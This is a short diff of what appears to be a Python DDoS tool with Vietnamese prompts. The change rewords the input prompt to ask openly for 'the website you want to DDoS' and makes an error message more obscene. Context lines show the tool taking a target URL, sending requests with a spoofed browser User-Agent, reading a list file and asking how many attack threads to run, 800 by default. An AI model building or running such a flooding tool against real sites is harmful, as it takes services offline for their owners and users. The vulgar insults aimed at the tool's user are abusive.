@@ -215,7 +215,7 @@ class MainLoop():
     def setup(self):
         global Close, Request, Tot_req
         while True:        
-            url = input('> Nhập link website đi thằng ngáo: ')
+            url = input('> Nhập link website muốn DDoS: ')
             url = self.check_url(url)
             try:
                 req = urllib.request.Request(url, None, {'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'})
@@ -232,7 +232,7 @@ class MainLoop():
                     lista.append(i.split("/n")[0])
                 break
             except:
-                print ('MÀY NHẬP SAI TÊN FILE THẰNG NGU.')
+                print ('MÀY NHẬP SAI TÊN FILE THẰNG NGU ÓC LỒN.')
         while True:                
             try:
                 num_threads = int(input('> Nhập số lượng máy chủ atak [800]: '))
